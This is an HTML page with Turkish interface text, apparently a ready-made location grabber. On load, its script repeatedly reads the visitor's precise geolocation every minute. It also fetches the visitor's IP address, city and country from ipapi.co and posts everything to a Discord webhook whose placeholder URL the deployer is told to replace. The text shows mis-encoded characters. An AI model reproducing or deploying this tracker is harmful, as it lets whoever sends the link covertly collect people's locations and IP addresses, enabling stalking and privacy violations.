<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Arka Plan Konum Bilgisi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #0a0a0a;
            color: #eaeaea;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background: #111;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 40px;
            width: 90%;
            max-width: 550px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            opacity: 0;
            animation: fadeIn 1s forwards;
        }
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        h1 {
            margin-top: 0;
            color: #ffa500;
        }
        p {
            font-size: 16px;
            line-height: 1.6;
        }
        .result {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
        }
        .hidden {
            display: none;
        }
        .blurred-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            z-index: -1;
        }
    </style>
</head>
<body>
    <div class="blurred-background"></div>
    <div id="content" class="container">
        <h1>Arka Plan Konum Bilgisi</h1>
        <p>Konumunuz arka planda alÄ±nmaya Ã§alÄ±ÅŸÄ±lÄ±yor...</p>
        <div id="result" class="result"></div>
    </div>
    <script>
        // WEBHOOK URL'NÄ°ZÄ° BURAYA YAZIN
        const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // Ã–RNEK

        const resultDiv = document.getElementById('result');

        // Konumu sÃ¼rekli olarak almaya Ã§alÄ±ÅŸ
        function startBackgroundLocation() {
            if ("geolocation" in navigator) {
                const options = {
                    enableHighAccuracy: true,  // Daha doÄŸru konum iÃ§in
                    timeout: 10000,           // 10 saniye sonra zaman aÅŸÄ±mÄ±
                    maximumAge: 0             // Ã–nbelleÄŸe alÄ±nmÄ±ÅŸ verileri kullanma
                };

                function getLocation() {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const { latitude, longitude } = position.coords;
                            const accuracy = position.coords.accuracy;
                            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

                            try {
                                await sendLocationLog(latitude, longitude, accuracy, mapsUrl);
                                resultDiv.innerHTML = "Konum bilgisi baÅŸarÄ±yla gÃ¶nderildi (Arka planda).";
                            } catch (error) {
                                console.error("Discord'a log gÃ¶nderilirken hata:", error);
                                resultDiv.innerHTML = `Discord'a bilgi gÃ¶nderilemedi. LÃ¼tfen konsolu kontrol edin.`;
                            }
                        },
                        (error) => {
                            let errorMessage = "Konum alÄ±namadÄ± (Arka planda).";
                            switch (error.code) {
                                case error.PERMISSION_DENIED:
                                    errorMessage = "Konum izni reddedildi (Bu beklenir)."; // Ä°zin reddedilse bile Ã§alÄ±ÅŸmaya devam et
                                    break;
                                case error.POSITION_UNAVAILABLE:
                                    errorMessage = "Konum bilgisi mevcut deÄŸil.";
                                    break;
                                case error.TIMEOUT:
                                    errorMessage = "Konum isteÄŸi zaman aÅŸÄ±mÄ±na uÄŸradÄ±.";
                                    break;
                            }
                            resultDiv.innerHTML = errorMessage;
                        },
                        options // OpsiyonlarÄ± buraya ekledik
                    );
                }

                // Konumu belirli aralÄ±klarla almaya devam et
                getLocation(); // Ä°lk seferde konumu al
                setInterval(getLocation, 60000); // Her 60 saniyede bir konumu al (1 dakika)
            } else {
                resultDiv.textContent = "TarayÄ±cÄ±nÄ±z konum Ã¶zelliÄŸini desteklemiyor.";
            }
        }

        async function sendLocationLog(lat, lon, acc, mapUrl) {
            const payload = {
                content: "ğŸ“ **Arka Plan Konum Bilgisi!**",
                embeds: [{
                    title: "Konum Bilgisi",
                    color: 5814783,
                    fields: [
                        { name: "Enlem (Latitude)", value: `\`\`\`${lat}\`\`\``, inline: true },
                        { name: "Boylam (Longitude)", value: `\`\`\`${lon}\`\`\``, inline: true },
                        { name: "DoÄŸruluk", value: `\`\`\`~${acc.toFixed(0)} metre\`\`\``, inline: true },
                        { name: "Harita Linki", value: `[Google Maps](${mapUrl})`, inline: false },
                        { name: "IP Adresi", value: "\`\`\`Bilgi alÄ±nÄ±yor...\`\`\`", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                if (!ipResponse.ok) {
                    throw new Error(`IP adresi alÄ±namadÄ±: ${ipResponse.status} ${ipResponse.statusText}`);
                }
                const ipData = await ipResponse.json();
                payload.embeds[0].fields[4].value = `\`\`\`${ipData.ip} (${ipData.city}, ${ipData.country_name})\`\`\``;
            } catch (ipError) {
                console.error("IP adresi alÄ±nÄ±rken hata:", ipError);
                payload.embeds[0].fields[4].value = `\`\`\`IP bilgisi alÄ±namadÄ±: ${ipError.message}\`\`\``;
            }

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error(`Webhook gÃ¶nderilemedi: ${response.status} ${response.statusText}`);
                }
                console.log("Discord'a log baÅŸarÄ±yla gÃ¶nderildi.");
            } catch (discordError) {
                console.error("Discord'a log gÃ¶nderilirken hata:", discordError);
                throw discordError;
            }
        }

        // Sayfa yÃ¼klendiÄŸinde arka plan konum takibini baÅŸlat
        window.onload = startBackgroundLocation;
    </script>
</body>
</html>
